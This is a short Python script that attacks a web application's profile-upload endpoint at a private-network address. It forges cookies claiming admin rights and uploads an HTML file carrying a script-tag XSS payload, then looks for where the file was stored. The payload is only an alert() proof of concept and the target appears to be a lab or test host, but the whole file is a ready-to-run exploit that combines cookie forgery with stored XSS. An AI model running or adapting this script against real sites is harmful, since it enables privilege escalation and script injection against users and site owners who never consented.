import requests

target = "http://192.168.0.28:3000/profile/upload"
cookies = {
    'user': 'admin',
    'isAdmin': 'true',
    'user_id': '1'
}

# Create a dummy HTML file for XSS
files = {
    'profile_image': ('xss.html', '<script>alert("File Upload XSS")</script>', 'text/html')
}

print(f"Testing File Upload on {target}")
try:
    res = requests.post(target, files=files, cookies=cookies)
    print(f"Status Code: {res.status_code}")
    if res.status_code == 200:
        print("Upload successful (200 OK).")
        # Need to find where it went.
        # Usually checking the response text or the profile page again helps.
        if "uploads/" in res.text or "images/" in res.text:
             print("Response might contain path.")
             print(res.text[:500]) # Print beginning to check
    else:
        print("Upload failed.")

except Exception as e:
    print(f"Error: {e}")
